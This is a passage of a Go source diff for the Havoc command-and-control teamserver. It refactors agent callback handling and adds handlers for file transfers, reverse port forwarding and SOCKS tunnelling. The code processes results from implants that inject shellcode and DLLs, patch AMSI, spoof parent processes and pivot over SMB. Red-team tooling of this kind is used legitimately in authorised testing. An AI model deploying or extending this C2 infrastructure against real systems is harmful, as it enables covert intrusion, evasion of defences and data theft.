 		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 	case COMMAND_INJECT_DLL:
 		var (
@@ -2068,7 +2589,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			Message["Message"] = "Failed to inject reflective dll: " + String
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2091,7 +2612,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			Message["Message"] = "Failed to spawned reflective dll: " + String
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2109,7 +2630,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			Message["Message"] = "Failed to inject shellcode"
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2341,7 +2862,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2354,7 +2875,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		switch Type {
 		case 0x0:
 			OutputMap["Output"] = string(Parser.ParseBytes())
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 
 			break
 
@@ -2364,7 +2885,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			OutputMap["Type"] = "Good"
 			OutputMap["Message"] = string(String)
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x91:
@@ -2373,7 +2894,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			OutputMap["Type"] = "Info"
 			OutputMap["Message"] = string(String)
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x92:
@@ -2382,7 +2903,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			OutputMap["Type"] = "Error"
 			OutputMap["Message"] = string(String)
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x98:
@@ -2394,7 +2915,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			OutputMap["Type"] = "Error"
 			OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] accured while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x99:
@@ -2404,7 +2925,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			OutputMap["Type"] = "Error"
 			OutputMap["Message"] = "Symbol not found: " + LibAndFunc
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 
 			break
 
@@ -2453,7 +2974,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			}
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
 		var (
@@ -2462,34 +2983,69 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		)
 
 		switch InfoID {
-		case 1:
+		case DOTNET_INFO_AMSI_PATCHED:
 
 			switch Parser.ParseInt32() {
 			case 0:
 				Message["Type"] = "Good"
-				Message["Message"] = "Successfully Patched ASMI"
+				Message["Message"] = "Successfully Patched Amsi"
 
 				break
 			case 1:
 				Message["Type"] = "Error"
-				Message["Message"] = "Failed to patch AMSI"
+				Message["Message"] = "Failed to patch Amsi"
 
 				break
 			case 2:
 				Message["Type"] = "Info"
-				Message["Message"] = "ASMI already patched"
+				Message["Message"] = "Amsi already patched"
 
 				break
 			}
 			break
-		case 2:
+
+		case DOTNET_INFO_NET_VERSION:
 			Message["Type"] = "Info"
-			Message["Message"] = "Using CLR version: " + string(Parser.ParseBytes())
+			Message["Message"] = "Using CLR Version: " + utils.UTF16BytesToString(Parser.ParseBytes())
+			break
+
+		case DOTNET_INFO_ENTRYPOINT:
+			var ThreadID int
+
+			if Parser.Length() >= 4 {
+				ThreadID = Parser.ParseInt32()
+				Message = map[string]string{
+					"Type":    "Good",
+					"Message": fmt.Sprintf("Assembly has been executed [Thread: %d]", ThreadID),
+				}
+			} else {
+				Message = map[string]string{
+					"Type":    "Error",
+					"Message": fmt.Sprintf("Callback error: DOTNET_INFO_ENTRYPOINT (0x3) expects more or at least 4 bytes but received %d bytes.", Parser.Length()),
+				}
+			}
+
+		case DOTNET_INFO_FINISHED:
+
+			Message = map[string]string{
+				"Type":    "Good",
+				"Message": "Finished executing assembly.",
+			}
 
 			break
+
+		case DOTNET_INFO_FAILED:
+
+			Message = map[string]string{
+				"Type":    "Error",
+				"Message": "Failed to execute assembly or initialize the clr",
+			}
+
+			break
+
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2505,7 +3061,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		Message["Message"] = "List available assembly versions:"
 		Message["Output"] = Output
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2518,7 +3074,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 		Message["Type"] = typeGood
 		Message["Message"] = "Changed parent pid to spoof: " + strconv.Itoa(Ppid)
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2739,7 +3295,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 				break
 			}
 
-			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 		}
 		break
 
@@ -2839,7 +3395,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			Message["Message"] = "Error while setting certain config"
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2853,17 +3409,31 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			var BmpBytes = Parser.ParseBytes()
 			var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"
 
-			logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
+			if len(BmpBytes) > 0 {
+				err := logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
+				if err != nil {
+					Message["Type"] = "Error"
+					Message["Message"] = "Failed to take a screenshot: " + err.Error()
+					return
+				}
 
-			Message["Type"] = "Good"
-			Message["Message"] = "Successful took screenshot"
+				Message["Type"] = "Good"
+				Message["Message"] = "Successful took screenshot"
 
-			Message["MiscType"] = "screenshot"
-			Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
-			Message["MiscData2"] = Name
+				Message["MiscType"] = "screenshot"
+				Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
+				Message["MiscData2"] = Name
+			} else {
+				Message["Type"] = "Error"
+				Message["Message"] = "Failed to take a screenshot"
+			}
+		} else {
+			Message["Type"] = "Error"
+			Message["Message"] = "Failed to take a screenshot"
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
 		break
 
 	case COMMAND_NET:
@@ -2964,7 +3534,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			)
 
 			if Parser.Length() > 0 {
-				var Domain = string(Parser.ParseBytes())
+				var Domain = common.DecodeUTF16(Parser.ParseBytes())
 
 				table := tablewriter.NewWriter(&Buffer)
 
@@ -3078,7 +3648,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			break
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -3125,7 +3695,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 				Message["Message"] = fmt.Sprintf("No pivots connected")
 			}
 
-		case DEMON_PIVOT_SMB_CONNECT:
+		case AGENT_PIVOT_SMB_CONNECT:
 			var Success = Parser.ParseInt32()
 
 			if Success == 1 {
@@ -3140,8 +3710,8 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 							var DemonInfo *Agent
 
-							if Funcs.AgentExists(AgentHdr.AgentID) {
-								DemonInfo = Funcs.AgentGetInstance(AgentHdr.AgentID)
+							if teamserver.AgentExist(AgentHdr.AgentID) {
+								DemonInfo = teamserver.AgentInstance(AgentHdr.AgentID)
 								Message["MiscType"] = "reconnect"
 								Message["MiscData"] = fmt.Sprintf("%v;%x", a.NameID, AgentHdr.AgentID)
 
@@ -3159,16 +3729,15 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 							} else {
 								DemonInfo = ParseResponse(AgentHdr.AgentID, AgentHdr.Data)
 								DemonInfo.Pivots.Parent = a
+
 								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
+
 								DemonInfo.Info.MagicValue = AgentHdr.MagicValue
 
-								LogDemonCallback(DemonInfo)
-								Funcs.AppendDemon(DemonInfo)
-								pk := Funcs.EventNewDemon(DemonInfo)
-								Funcs.EventAppend(pk)
-								Funcs.EventBroadcast("", pk)
+								teamserver.AgentAdd(DemonInfo)
+								teamserver.AgentSendNotify(DemonInfo)
 
-								go DemonInfo.BackgroundUpdateLastCallbackUI(Funcs)
+								go DemonInfo.BackgroundUpdateLastCallbackUI(teamserver)
 							}
 
 							if DemonInfo != nil {
@@ -3193,7 +3762,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 					Message["Message"] = "[SMB] Failed to connect: Invalid response"
 				}
 			} else {
-				logger.Debug("DEMON_PIVOT_SMB_CONNECT: Failed")
+				logger.Debug("AGENT_PIVOT_SMB_CONNECT: Failed")
 				var (
 					ErrorCode          = Parser.ParseInt32()
 					ErrorString, found = Win32ErrorCodes[ErrorCode]
@@ -3211,7 +3780,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 			break
 
-		case DEMON_PIVOT_SMB_DISCONNECT:
+		case AGENT_PIVOT_SMB_DISCONNECT:
 
 			if Parser.Length() > 0 {
 				var (
@@ -3226,7 +3795,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 					Message["MiscType"] = "disconnect"
 					Message["MiscData"] = fmt.Sprintf("%x", AgentID)
 
-					AgentInstance := Funcs.AgentGetInstance(AgentID)
+					AgentInstance := teamserver.AgentInstance(AgentID)
 					if AgentInstance != nil {
 						AgentInstance.Active = false
 						AgentInstance.Reason = "Disconnected"
@@ -3238,7 +3807,6 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 							break
 						}
 					}
-
 				} else {
 					Message["Type"] = "Error"
 					Message["Message"] = fmt.Sprintf("[SMB] Failed to disconnect agent %x", AgentID)
@@ -3247,7 +3815,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 
 			break
 
-		case DEMON_PIVOT_SMB_COMMAND:
+		case AGENT_PIVOT_SMB_COMMAND:
 
 			if Parser.Length() > 0 {
 				var (
@@ -3263,7 +3831,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 						found := false
 						for i := range a.Pivots.Links {
 							if a.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
-								a.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, Funcs)
+								a.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, teamserver)
 								found = true
 								break
 							}
@@ -3290,8 +3858,583 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			logger.Debug(fmt.Sprintf("CommandID not found: %x", CommandID))
 		}
 
-		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
+
+	case COMMAND_TRANSFER:
+
+		var (
+			SubCommand = Parser.ParseInt32()
+			Message    map[string]string
+		)
+
+		switch SubCommand {
+
+		case 0x0: /* transfer list */
+			var (
+				Data  string
+				Count int
+			)
+
+			Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "File ID", "Size", "Progress", "State", "File")
+			Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "-------", "----", "--------", "-----", "----")
+
+			for Parser.Length() >= 12 {
+				var (
+					FileID = Parser.ParseInt32()
+					Size   = Parser.ParseInt32()
+					State  = Parser.ParseInt32()
+				)
+
+				if download := a.DownloadGet(FileID); download != nil {
+					var (
+						StateString string
+						Progress    string
+					)
+
+					if State == DOWNLOAD_STATE_RUNNING {
+						StateString = "Running"
+					} else if State == DOWNLOAD_STATE_STOPPED {
+						StateString = "Stopped"
+					} else if State == DOWNLOAD_STATE_REMOVE {
+						/* pending remove */
+						StateString = "Removed"
+					}
+
+					Progress = fmt.Sprintf("%.2f%%", common.PercentageChange(Size, download.TotalSize))
+					Data += fmt.Sprintf(" %-8x  %-8s  %-8s  %-8s %s\n", FileID, common.ByteCountSI(int64(download.TotalSize)), Progress, StateString, download.FilePath)
+					Count++
+				}
+			}
+
+			Message = map[string]string{
+				"Type":    "Info",
+				"Message": fmt.Sprintf("List downloads [%v current downloads]:", Count),
+				"Output":  "\n" + Data,
+			}
+
+			break
+
+		case 0x1: /* transfer stop */
+
+			if Parser.Length() >= 8 {
+				var (
+					Found  = Parser.ParseInt32()
+					FileID = Parser.ParseInt32()
+				)
+
+				if Found == win32.TRUE {
+					if download := a.DownloadGet(FileID); download != nil {
+						Message = map[string]string{
+							"Type":    "Good",
+							"Message": fmt.Sprintf("Successful found and stopped download: %x", FileID),
+						}
+					} else {
+						Message = map[string]string{
+							"Type":    "Error",
+							"Message": fmt.Sprintf("Couldn't stop download %x: Download does not exists", FileID),
+						}
+					}
+				} else {
+					Message = map[string]string{
+						"Type":    "Error",
+						"Message": fmt.Sprintf("Couldn't stop download %x: FileID not found", FileID),
+					}
+				}
+
+			} else {
+				Message = map[string]string{
+					"Type":    "Error",
+					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x1 (stop). Expected at least 8 bytes but received %v bytes", Parser.Length()),
+				}
+			}
+
+			break
+
+		case 0x2: /* transfer resume */
+
+			if Parser.Length() >= 8 {
+				var (
+					Found  = Parser.ParseInt32()
+					FileID = Parser.ParseInt32()
+				)
+
+				if Found == win32.TRUE {
+					if download := a.DownloadGet(FileID); download != nil {
+						Message = map[string]string{
+							"Type":    "Good",
+							"Message": fmt.Sprintf("Successful found and resumed download: %x", FileID),
+						}
+					} else {
+						Message = map[string]string{
+							"Type":    "Error",
+							"Message": fmt.Sprintf("Couldn't resume download %x: Download does not exists", FileID),
+						}
+					}
+				} else {
+					Message = map[string]string{
+						"Type":    "Error",
+						"Message": fmt.Sprintf("Couldn't resume download %x: FileID not found", FileID),
+					}
+				}
+
+			} else {
+				Message = map[string]string{
+					"Type":    "Error",
+					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x2 (resume). Expected at least 8 bytes but received %v bytes", Parser.Length()),
+				}
+			}
+
+			break
+
+		case 0x3: /* transfer remove */
+
+			if Parser.Length() >= 8 {
+				var (
+					Found  = Parser.ParseInt32()
+					FileID = Parser.ParseInt32()
+				)
+
+				if Found == win32.TRUE {
+					if download := a.DownloadGet(FileID); download != nil {
+						Message = map[string]string{
+							"Type":    "Good",
+							"Message": fmt.Sprintf("Successful found and removed download: %x", FileID),
+						}
+					} else {
+						Message = map[string]string{
+							"Type":    "Error",
+							"Message": fmt.Sprintf("Couldn't remove download %x: Download does not exists", FileID),
+						}
+					}
+				} else {
+					Message = map[string]string{
+						"Type":    "Error",
+						"Message": fmt.Sprintf("Couldn't remove download %x: FileID not found", FileID),
+					}
+				}
+
+			} else {
+				Message = map[string]string{
+					"Type":    "Error",
+					"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x3 (remove). Expected at least 8 bytes but received %v bytes", Parser.Length()),
+				}
+			}
+
+			break
+		}
+
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
+		break
+
+	case COMMAND_SOCKET:
+		var (
+			SubCommand = 0
+			Message    map[string]string
+		)
+
+		if Parser.Length() >= 4 {
+			SubCommand = Parser.ParseInt32()
+
+			switch SubCommand {
+			case SOCKET_COMMAND_RPORTFWD_ADD:
+
+				if Parser.Length() >= 16 {
+
+					var (
+						SocktID = 0
+						Success = 0
+						LclAddr = 0
+						LclPort = 0
+						FwdAddr = 0
+						FwdPort = 0
+
+						FwdString string
+						LclString string
+					)
+
+					Success = Parser.ParseInt32()
+					SocktID = Parser.ParseInt32()
+					LclAddr = Parser.ParseInt32()
+					LclPort = Parser.ParseInt32()
+					FwdAddr = Parser.ParseInt32()
+					FwdPort = Parser.ParseInt32()
+
+					LclString = common.Int32ToIpString(int64(LclAddr))
+					FwdString = common.Int32ToIpString(int64(FwdAddr))
+
+					if Success == win32.TRUE {
+						a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Started reverse port forward on %s:%d to %s:%d [Id: %x]", LclString, LclPort, FwdString, FwdPort, SocktID), "")
+						a.Console(teamserver.AgentConsole, "Warn", "Dont forget to go interactive to make it usable", "")
+
+						return
+					} else {
+						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to start reverse port forward on %s:%d to %s:%d", LclString, LclPort, FwdString, FwdPort), "")
+						return
+					}
+
+				} else {
+					Message = map[string]string{
+						"Type":    "Error",
+						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_ADD : 0x0) expected at least 16 bytes but received %v bytes", Parser.Length()),
+					}
+				}
+
+				break
+
+			case SOCKET_COMMAND_RPORTFWD_LIST:
+
+				var (
+					FwdList  string
+					FwdCount int
+				)
+
+				FwdList += "\n"
+				FwdList += fmt.Sprintf(" %-12s %s\n", "Socket ID", "Forward")
+				FwdList += fmt.Sprintf(" %-12s %s\n", "---------", "-------")
+
+				for Parser.Length() != 0 {
+					var (
+						SocktID = 0
+						LclAddr = 0
+						LclPort = 0
+						FwdAddr = 0
+						FwdPort = 0
+
+						FwdString string
+						LclString string
+					)
+
+					SocktID = Parser.ParseInt32()
+					LclAddr = Parser.ParseInt32()
+					LclPort = Parser.ParseInt32()
+					FwdAddr = Parser.ParseInt32()
+					FwdPort = Parser.ParseInt32()
+
+					LclString = common.Int32ToIpString(int64(LclAddr))
+					FwdString = common.Int32ToIpString(int64(FwdAddr))
+
+					FwdList += fmt.Sprintf(" %-12x %s\n", SocktID, fmt.Sprintf("%s:%d -> %s:%d", LclString, LclPort, FwdString, FwdPort))
+					FwdCount++
+				}
+
+				a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("reverse port forwards [%d active]:", FwdCount), FwdList)
+				return
+
+			case SOCKET_COMMAND_RPORTFWD_REMOVE:
+
+				if Parser.Length() >= 20 {
+
+					var (
+						SocktID = 0
+						LclAddr = 0
+						LclPort = 0
+						FwdAddr = 0
+						FwdPort = 0
+
+						FwdString string
+						LclString string
+					)
+
+					SocktID = Parser.ParseInt32()
+					LclAddr = Parser.ParseInt32()
+					LclPort = Parser.ParseInt32()
+					FwdAddr = Parser.ParseInt32()
+					FwdPort = Parser.ParseInt32()
+
+					LclString = common.Int32ToIpString(int64(LclAddr))
+					FwdString = common.Int32ToIpString(int64(FwdAddr))
+
+					Message = map[string]string{
+						"Type":    "Info",
+						"Message": fmt.Sprintf("Successful closed and removed rportfwd [SocketID: %x] [Forward: %s:%d -> %s:%d]", SocktID, LclString, LclPort, FwdString, FwdPort),
+					}
+
+					/* finally close our port forwarder */
+					a.PortFwdClose(SocktID)
+
+				} else {
+					Message = map[string]string{
+						"Type":    "Info",
+						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_REMOVE : 0x4) expected at least 20 bytes but received %v bytes", Parser.Length()),
+					}
+				}
+
+				break
+
+			case SOCKET_COMMAND_RPORTFWD_CLEAR:
+
+				if Parser.Length() >= 4 {
+
+					var Success = Parser.ParseInt32()
+
+					if Success == win32.TRUE {
+						Message = map[string]string{
+							"Type":    "Good",
+							"Message": "Successful closed and removed all rportfwds",
+						}
+					} else {
+						Message = map[string]string{
+							"Type":    "Erro",
+							"Message": "Failed to closed and remove all rportfwds",
+						}
+					}
+				} else {
+					Message = map[string]string{
+						"Type":    "Info",
+						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET sub-command rportfwd (SOCKET_COMMAND_RPORTFWD_CLEAR : 0x3) expected at least 4 bytes but received %v bytes", Parser.Length()),
+					}
+				}
+
+				break
+
+			case SOCKET_COMMAND_SOCKSPROXY_ADD:
+				break
+
+			case SOCKET_COMMAND_OPEN:
+
+				if Parser.Length() >= 16 {
+
+					var (
+						SocktID = 0
+						LclAddr = 0
+						LclPort = 0
+						FwdAddr = 0
+						FwdPort = 0
+
+						FwdString string
+					)
+
+					SocktID = Parser.ParseInt32()
+					LclAddr = Parser.ParseInt32()
+					LclPort = Parser.ParseInt32()
+					FwdAddr = Parser.ParseInt32()
+					FwdPort = Parser.ParseInt32()
+
+					FwdString = common.Int32ToIpString(int64(FwdAddr))
+					FwdString = fmt.Sprintf("%s:%d", FwdString, FwdPort)
+
+					if Socket := a.PortFwdGet(SocktID); Socket != nil {
+						/* Socket already exists. don't do anything. */
+						return
+					}
+
+					/* add this rportfw */
+					a.PortFwdNew(SocktID, LclAddr, LclPort, FwdAddr, FwdPort, FwdString)
+
+					err := a.PortFwdOpen(SocktID)
+					if err != nil {
+						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to open reverse port forward host %s: %v", FwdString, err), "")
+						return
+					}
+
+					/* after we managed to open a socket to the forwarded host lets start a
+					 * goroutine where we read the data from the forwarded host and send it to the agent. */
+					go func() {
+
+						for {
+
+							/* get rportfwd socket from array */
+							if Socket := a.PortFwdGet(SocktID); Socket != nil {
+
+								if Data, err := a.PortFwdRead(SocktID); err == nil {
+
+									/* only send the data if there is something... */
+									if len(Data) > 0 {
+
+										/* make a new job */
+										var job = Job{
+											Command: COMMAND_SOCKET,
+											Data: []any{
+												SOCKET_COMMAND_READ_WRITE,
+												Socket.SocktID,
+												Data,
+											},
+										}
+
+										/* append the job to the task queue */
+										a.AddJobToQueue(job)
+
+									}
+
+								} else {
+									/* we failed to read from the portfwd */
+									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", Socket.SocktID, err))
+								}
+
+							} else {
+								/* seems like we have been removed from the list.
+								 * exit this goroutine */
+								return
+							}
+
+						}
+
+					}()
+
+				}
+
+				break
+
+			case SOCKET_COMMAND_READ_WRITE:
+				/* if we receive the SOCKET_COMMAND_READ_WRITE command
+				 * that means that we should read the callback and send it to the forwared host/socks proxy */
+
+				if Parser.Length() >= 8 {
+					var (
+						Id   = Parser.ParseInt32()
+						Type = Parser.ParseInt32()
+						Data = Parser.ParseBytes()
+					)
+
+					if Type == SOCKET_TYPE_CLIENT {
+
+						/* check if there is a socket with that portfwd id */
+						if Socket := a.PortFwdGet(Id); Socket != nil {
+
+							/* write the data to the forwarded host */
+							err := a.PortFwdWrite(Id, Data)
+							if err != nil {
+								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
+								return
+							}
+
+						} else {
+
+							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+
+						}
+
+					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
+
+						/* check if there is a socket with that socks proxy id */
+						if Socket := a.SocksClientGet(Id); Socket != nil {
+
+							/* write the data to socks proxy */
+							_, err := Socket.Conn.Write(Data)
+							if err != nil {
+								a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")
+
+								/* TODO: remove socks proxy client */
+								a.SocksClientClose(SOCKET_TYPE_CLIENT)
+
+								return
+							}
+
+						} else {
+
+							logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+
+						}
+
+					}
+
+				}
+
+				break
+
+			case SOCKET_COMMAND_CLOSE:
+
+				if Parser.Length() >= 8 {
+					var (
+						SockId = Parser.ParseInt32()
+						Type   = Parser.ParseInt32()
+						Socket *PortFwd
+					)
+
+					/* NOTE: for now the reverse port forward close command is not used. */
+					if Type == SOCKET_TYPE_REVERSE_PORTFWD || Type == SOCKET_TYPE_CLIENT {
+
+						/* check if there is a socket with that portfwd id */
+						if Socket = a.PortFwdGet(SockId); Socket != nil {
+
+							/* Based on the type of the socket tell the operator
+							 * for example SOCKET_TYPE_CLIENT is something we can ignore.
+							 * But if it's a SOCKET_TYPE_REVERSE_PORTFWD then let the operator know. */
+							if Type == SOCKET_TYPE_REVERSE_PORTFWD {
+								var LclString = common.Int32ToIpString(int64(Socket.LclAddr))
+								a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Closed reverse port forward [Id: %x] [Bind %s:%d] [Forward: %s]", Socket.SocktID, LclString, Socket.LclPort, Socket.Target), "")
+							}
+
+							/* finally close our port forwarder */
+							a.PortFwdClose(SockId)
+						}
+
+					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
+
+						if Client := a.SocksClientGet(SockId); Client != nil {
+
+							/* lets remove it */
+							a.SocksClientClose(SockId)
+
+						}
+
+					}
+				}
+
+				break
+
+			case SOCKET_COMMAND_CONNECT:
+
+				if Parser.Length() >= 4 {
+
+					var (
+						Success  = Parser.ParseInt32()
+						SocketId = Parser.ParseInt32()
+					)
+
+					if Client := a.SocksClientGet(SocketId); Client != nil {
+
+						if Success == win32.TRUE {
+
+							_, err := Client.Conn.Write([]byte{0x00, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+							if err != nil {
+								return
+							}
+							Client.Connected = true
+
+						} else {
+
+							a.SocksClientClose(SocketId)
+
+						}
+
+					} else {
+
+						logger.Error(fmt.Sprintf("Socket id not found: %x\n", SocketId))
+
+					}
+
+				}
+
+				break
+			}
+
+		} else {
+			Message = map[string]string{
+				"Type":    "Error",
+				"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_SOCKET expected at least 4 bytes but received %v bytes", Parser.Length()),
+			}
+		}
+
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
+		break
+
+	default:
+		/* end of the switch case output parser */
+		break
 	}
+}
+
+func (a *Agent) Console(Console func(DemonID string, CommandID int, Output map[string]string), Type, Text, Output string) {
+	var Message = map[string]string{
+		"Type":    Type,
+		"Message": Text,
+		"Output":  Output,
+	}
+
+	Console(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 }
